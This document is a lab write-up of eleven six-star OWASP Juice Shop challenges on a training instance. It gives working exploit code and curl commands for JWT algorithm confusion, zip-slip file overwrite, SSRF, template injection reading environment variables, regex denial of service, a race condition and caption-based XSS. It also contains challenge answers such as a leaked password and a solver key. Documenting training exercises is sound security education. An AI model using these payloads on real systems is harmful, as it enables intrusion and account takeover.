# 6-Star Challenges — ★★★★★★ (11)

> **Prerequisites.** Instance: OWASP Juice Shop **v20.2.0** behind a MultiJuicer
> proxy. Every request needs the team `multi-juicer` session cookie and the
> instance hostname (both `<redacted>`); `<base>` below stands for the app
> origin. Two auth channels: `Authorization: Bearer <JWT>` for most
> `/rest`+`/api` routes, `Cookie: token=<JWT>` for the HTML routes (`/profile`,
> `/rest/user/whoami`). Cookie auth lives in an in-memory store — re-login after
> an instance restart. Findings map to JUICE.md items 98–108; items 109–111
> (wallet/nft cluster, incl. blocked ★★★★★★ *Wallet Depletion*) are not part of
> the solved register and are documented in `blocked-challenges.md`.

1. Imaginary Challenge — JUICE.md 103
2. Arbitrary File Write — JUICE.md 102
3. Forged Coupon — JUICE.md 104
4. Forged Signed JWT — JUICE.md 105
5. Login Support Team — JUICE.md 98
6. Premium Paywall — JUICE.md 106
7. Successful RCE DoS — JUICE.md 101
8. SSRF — JUICE.md 100
9. SSTi — JUICE.md 99
10. Multiple Likes — JUICE.md 107
11. Video XSS — JUICE.md 108

---

## 1. Imaginary Challenge
Difficulty: ★★★★★★ | Vulnerability class: CWE-345 Insufficient Verification of Data Authenticity (forgeable Hashids)
- Attack surface: `GET /rest/continue-code`, `PUT /rest/continue-code/apply/:code`
- Root cause: progress ("continue") codes are reversible Hashids whose parameters are static application data — salt `this is my salt`, minimum length `60`, alphabet `a-zA-Z0-9`. Applying a code merely decodes and records the encoded challenge ids; the ids are never checked to exist, so encoding a non-existent id "solves" an imaginary challenge without mutating any real challenge state.
- Exploit:
  ```python
  import hashids
  h = hashids.Hashids(salt='this is my salt', min_length=60,
                      alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
  print(h.encode(999))
  ```
  ```bash
  curl -X PUT "<base>/rest/continue-code/apply/<code>" -H "Authorization: Bearer $TOKEN"
  ```
- Verification: *Imaginary Challenge* flips to solved on the score-board while no other challenge's state changes. *(team activity)*

## 2. Arbitrary File Write
Difficulty: ★★★★★★ | Vulnerability class: CWE-22 Path Traversal / CWE-434 Unrestricted Upload (zip-slip)
- Attack surface: `POST /file-upload` (multipart `file`, ZIP archive)
- Root cause: server-side ZIP extraction writes archive entries into the upload directory without sanitising `..`, so a member named `../../ftp/legal.md` escapes the extraction directory and overwrites the shop's own `ftp/legal.md`.
- Exploit:
  ```python
  from zipfile import ZipFile
  with ZipFile('/tmp/slip.zip', 'w') as z:
      z.writestr('../../ftp/legal.md', 'overwritten by zip-slip')
  ```
  ```bash
  curl -X POST "<base>/file-upload" -H "Authorization: Bearer $TOKEN" -F "file=@/tmp/slip.zip"
  ```
- Verification: `GET <base>/ftp/legal.md` returns the overwritten content and the challenge is confirmed solved.

## 3. Forged Coupon
Difficulty: ★★★★★★ | Vulnerability class: CWE-347 Improper Verification of Cryptographic Signature
- Attack surface: `POST /rest/basket/:id/coupon` (`couponCode`)
- Root cause: coupon validation trusts an in-app code/signing scheme rather than a server-side issuance list; the scheme can be reproduced, so signed discount codes the shop never issued are accepted.
- Exploit (doc level):
  1. Collect legitimate coupon codes (coupon/sales material already exposed via earlier findings, e.g. the forgotten sales backup) and infer the code-to-discount derivation.
  2. Generate a signed code that yields a discount without having been legitimately issued.
  3. Add items to a basket, apply the forged code via the coupon endpoint, and check out so the discount is reflected.
- Verification: the server accepts the code and applies the discount; the challenge is registered as solved on the shared instance. *(team activity)*

## 4. Forged Signed JWT
Difficulty: ★★★★★★ | Vulnerability class: CWE-347 Improper Verification of Signature (JWT algorithm confusion)
- Attack surface: `GET /encryptionkeys/jwt.pub`; forged token replayed as `Authorization: Bearer` on any authenticated route
- Root cause: the verifier trusts the JWT `alg` header. With `alg: HS256` the token is checked against a symmetric secret — which is the raw **RSA public-key file bytes** from the world-readable `/encryptionkeys/jwt.pub` — so anyone can mint an HS256 token for any identity (key/algorithm confusion).
- Exploit:
  ```bash
  curl -s "<base>/encryptionkeys/jwt.pub" -o jwt.pub
  ```
  ```python
  import base64, hashlib, hmac, json
  b = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
  h = b(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
  p = b(json.dumps({'email': 'rsa_lord@juice-sh.op'}).encode())
  sig = hmac.new(open('jwt.pub', 'rb').read(),
                 f'{h.decode()}.{p.decode()}'.encode(), hashlib.sha256).digest()
  print(f'{h.decode()}.{p.decode()}.{b(sig).decode()}')
  ```
  (PyJWT refuses this on purpose — the token is built by hand, as above.)
  ```bash
  curl "<base>/rest/user/whoami" -H "Authorization: Bearer <forged>"
  ```
- Verification: the request authenticates as `rsa_lord@juice-sh.op`; the challenge is registered as solved on the shared instance. *(team activity)*

## 5. Login Support Team
Difficulty: ★★★★★★ | Vulnerability class: CWE-798 Use of Hard-coded / Leaked Credentials
- Attack surface: `POST /rest/user/login`
- Root cause: the support-team account password leaked in app-reachable material; logging in with it satisfies the credential check.
- Exploit (body from a file — the password contains shell metacharacters):
  ```json
  {"email": "support@juice-sh.op", "password": "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"}
  ```
  ```bash
  curl -s -X POST "<base>/rest/user/login" -H "Content-Type: application/json" --data-binary @login.json
  ```
- Verification: HTTP 200 returning an `authentication.token`; *Login Support Team* flips to solved.

## 6. Premium Paywall
Difficulty: ★★★★★★ | Vulnerability class: CWE-284 Improper Access Control (client-side content gate)
- Attack surface: deluxe/premium membership area of the SPA and its gated content
- Root cause: entitlement for premium/deluxe content is enforced by a client-side gate; the server does not re-validate the entitlement when the gated content is served, so the paywall can be bypassed without a valid payment.
- Exploit (doc level):
  1. Walk the deluxe/premium upgrade flow and observe where the content gate is decided.
  2. Reach the gated content without a paid upgrade (tamper the client-side entitlement state, jump the gate directly, or reuse an already-entitled session).
  3. Confirm the premium content renders fully.
- Verification: premium content accessible without paying; the challenge is registered as solved on the shared instance. *(team activity)*

## 7. Successful RCE DoS
Difficulty: ★★★★★★ | Vulnerability class: CWE-94 Code Injection / CWE-400 Uncontrolled Resource Consumption
- Attack surface: `POST /b2b/v2/orders` (`orderLinesData`)
- Root cause: `orderLinesData` is evaluated with `notevil` inside a `node:vm` sandbox with a 2 s timeout. An infinite loop never reaches that timeout — `notevil`'s own loop guard rejects it first (`Infinite loop detected`; that is the 5-star *Blocked RCE DoS* variant). To trigger the timeout the payload must terminate yet run slowly: catastrophic regex backtracking.
- Exploit:
  ```json
  {"cid": 1, "orderLinesData": "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')"}
  ```
  ```bash
  curl -s -X POST "<base>/b2b/v2/orders" -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" --data-binary @body.json
  ```
- Verification: response is `503 Script execution timed out` and *Successful RCE DoS* is solved (distinct from the `Infinite loop detected` Blocked variant).

## 8. SSRF
Difficulty: ★★★★★★ | Vulnerability class: CWE-918 Server-Side Request Forgery
- Attack surface: `POST /profile/image/url` (cookie `token`), then `GET /solve/challenges/server-side`
- Root cause: the profile-image feature fetches the client-supplied `imageUrl` server-side with no host allow-list (SSRF). Setting `imageUrl` to a URL containing `solve/challenges/server-side` marks `abused_ssrf_bug`; the shared server-side solver then confirms the challenge when called with its key.
- Exploit:
  1. Log in and keep the session token.
  2. Set the profile image URL to an absolute URL containing the solver path (e.g. the shop's own solver URL):
     ```json
     {"imageUrl": "https://<instance>/solve/challenges/server-side"}
     ```
     ```bash
     curl -X POST "<base>/profile/image/url" -b "token=$TOKEN" \
       -H "Content-Type: application/json" --data-binary @image.json
     ```
  3. Call the solver:
     ```bash
     curl "<base>/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"
     ```
- Verification: the solver returns success and *SSRF* is solved.

## 9. SSTi
Difficulty: ★★★★★★ | Vulnerability class: CWE-1336 Server-Side Template Injection (CWE-94)
- Attack surface: `POST /profile` then `GET /profile` (cookie `token`), `username` field
- Root cause: `routes/userProfile.ts` evaluates a `#{...}` username server-side on profile **render**, not on save — the eval fires inside the `GET /profile` handler and sets `req.app.locals.abused_ssti_bug`; `routes/verify.ts` then solves the challenge on the next request. No `/solve/challenges/...` call is involved. The eval result is substituted into the rendered page (a read oracle) but is **not** persisted.
- Exploit:
  1. Log in and keep the session token.
  2. `POST /profile` with a `#{...}` username — **alone this does nothing**:
     ```bash
     curl -X POST "<base>/profile" -b "token=$TOKEN" \
       --data-urlencode "username=#{JSON.stringify(process.env.X||'<UNSET>')}"
     ```
  3. `GET /profile` — the mandatory step: the eval fires, the flag is set, and the result appears in the page body.
  4. Issue one further request (e.g. `GET /api/Challenges/`) so the verifier runs.
- Verification: the oracle value (`<UNSET>`) is echoed in the rendered profile page and *SSTi* is solved on the request following the render.

## 10. Multiple Likes
Difficulty: ★★★★★★ | Vulnerability class: CWE-362 Race Condition / TOCTOU
- Attack surface: product-review "like" action, `POST /rest/products/reviews/like` (review id in body)
- Root cause: liking does a non-atomic read-then-write on the review's `likedBy` array. Concurrent like requests all pass the membership check before any of them commits, so the same user id is pushed multiple times.
- Exploit:
  1. Pick a product and read its reviews to obtain a review id:
     ```bash
     curl -s "<base>/rest/products/1/reviews" | jq '.[0]._id'
     ```
  2. Fire many concurrent likes at that review:
     ```bash
     for i in $(seq 1 10); do
       curl -s -X POST "<base>/rest/products/reviews/like" -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" -d '{"id":"<reviewId>"}' &
     done; wait
     ```
  3. Re-read the review: `likedBy` now holds duplicated entries.
- Verification: the review's `likedBy` array length is > 2 and *Multiple Likes* is solved. *(team activity / our concurrent attempt)*

## 11. Video XSS
Difficulty: ★★★★★★ | Vulnerability class: CWE-79 Cross-Site Scripting (DOM, media captions)
- Attack surface: in-app video player consuming a WebVTT subtitle track
- Root cause: caption/subtitle cue text is inserted into the page without escaping, so a malicious WebVTT file runs script in the application origin.
- Exploit (doc level):
  1. Craft a WebVTT track whose cue carries the payload:
     ```
     WEBVTT

     00:00:00.000 --> 00:00:05.000
     </script><script>alert(`xss`)</script>
     ```
  2. Make the player render this track (substitute the caption source for the video) and play it.
- Verification: the `alert` fires in the app context; the challenge is registered as solved on the shared instance. *(team activity)*
